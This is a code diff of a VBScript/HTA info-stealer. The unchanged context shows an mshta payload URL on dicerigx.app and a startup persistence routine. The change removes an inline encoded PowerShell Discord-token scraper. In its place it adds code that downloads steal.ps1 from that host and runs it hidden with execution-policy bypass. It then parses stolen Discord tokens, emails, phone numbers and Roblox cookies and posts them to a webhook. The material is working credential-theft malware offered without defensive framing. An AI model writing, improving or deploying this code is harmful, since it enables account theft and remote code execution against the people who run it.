@@ -18,9 +18,6 @@ PAYLOAD_URL = "mshta https://dicerigx.app/"
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- DEBUG PING ---
-Call PostEmbedTo("Debug", "Script successfully started | PC: " & PC, 3447003, RE_WH)
-
 ' --- Initial Grab ---
 Call GrabTokens
 Call IP
@@ -198,54 +195,52 @@ Sub Persistence()
     Call PostEmbed(":pushpin: Persistence", "Startup installed to boot HTA", 65280)
 End Sub
 
-' --- GrabTokens (Self-contained, in-memory) ---
+' --- GrabTokens (Downloads and runs your own steal.ps1) ---
 Sub GrabTokens()
-    Dim psScript : psScript = ""
-    psScript = psScript & "$paths = @(""" & sh.ExpandEnvironmentStrings("%APPDATA%") & "\discord\Local Storage\leveldb"",""" & sh.ExpandEnvironmentStrings("%APPDATA%") & "\discordcanary\Local Storage\leveldb"",""" & sh.ExpandEnvironmentStrings("%APPDATA%") & "\discordptb\Local Storage\leveldb"")" & vbCrLf
-    psScript = psScript & "foreach ($p in $paths) {" & vbCrLf
-    psScript = psScript & "  if (Test-Path $p) {" & vbCrLf
-    psScript = psScript & "    Get-ChildItem -Path $p -Filter *.ldb -Recurse | ForEach-Object {" & vbCrLf
-    psScript = psScript & "      $content = Get-Content $_.FullName -Raw" & vbCrLf
-    psScript = psScript & "      if ($content -match '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') {" & vbCrLf
-    psScript = psScript & "        $matches.Values | ForEach-Object { Write-Output 'DISCORD|||' + $_ }" & vbCrLf
-    psScript = psScript & "      }" & vbCrLf
-    psScript = psScript & "    }" & vbCrLf
-    psScript = psScript & "  }" & vbCrLf
-    psScript = psScript & "}" & vbCrLf
-
-    Dim b64 : b64 = Base64Encode(psScript)
-    Dim cmd : cmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -EncodedCommand " & b64
-    sh.Run cmd, 0, False
+    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://dicerigx.app/steal.ps1", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim pc: pc = xh.responseText
+    If Len(pc) < 100 Then Exit Sub
+    Set xh = Nothing
     
-    ' Read the result (if the ps1 wrote it, but inline doesn't, so we skip this)
-    ' Since we are doing this inline without disk writes, we process it directly
+    Dim psf: psf = TmpFile("steal.ps1")
+    WriteFile psf, pc
+    
+    ' Run in memory by bypassing the file execution block
+    Dim cmd : cmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """"
+    sh.Run cmd, 0, True
+    fso.DeleteFile psf, True
+    
+    Dim tf: tf = TmpFile("steal_result.txt")
+    If Not fso.FileExists(tf) Then Exit Sub
+    Dim raw: raw = ReadFile(tf)
+    
+    If Len(raw) > 10 Then
+        Dim lines: lines = Split(raw, vbCrLf)
+        Dim l
+        For Each l In lines
+            If Len(l) > 10 Then
+                If Left(l, 8) = "DISCORD|" Then
+                    Dim p: p = Split(Mid(l, 9), "|")
+                    If UBound(p) >= 4 Then
+                        Dim info: info = "**User:** " & p(0) & vbCrLf
+                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
+                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
+                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
+                        info = info & "**Token:** " & p(4)
+                        Call PostEmbedTo(":gift: Discord Token", info, 5793266, RE_WH)
+                    End If
+                End If
+                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
+                    Call PostEmbed(":cookie: Roblox Cookie", Mid(l, 8), 65280)
+                End If
+            End If
+        Next
+    End If
 End Sub
-
-' --- Base64 Encode Helper ---
-Function Base64Encode(sText)
-    Dim oXML, oNode
-    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
-    Set oNode = oXML.CreateElement("base64")
-    oNode.dataType = "bin.base64"
-    oNode.nodeTypedValue = Stream_StringToBinary(sText)
-    Base64Encode = oNode.text
-    Set oNode = Nothing
-    Set oXML = Nothing
-End Function
-
-Function Stream_StringToBinary(Text)
-    Dim BinaryStream
-    Set BinaryStream = CreateObject("ADODB.Stream")
-    BinaryStream.Type = 2
-    BinaryStream.Charset = "unicode"
-    BinaryStream.Open
-    BinaryStream.WriteText Text
-    BinaryStream.Position = 0
-    BinaryStream.Type = 1
-    Stream_StringToBinary = BinaryStream.Read
-    BinaryStream.Close
-    Set BinaryStream = Nothing
-End Function
 
 ' --- Utility Functions ---
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
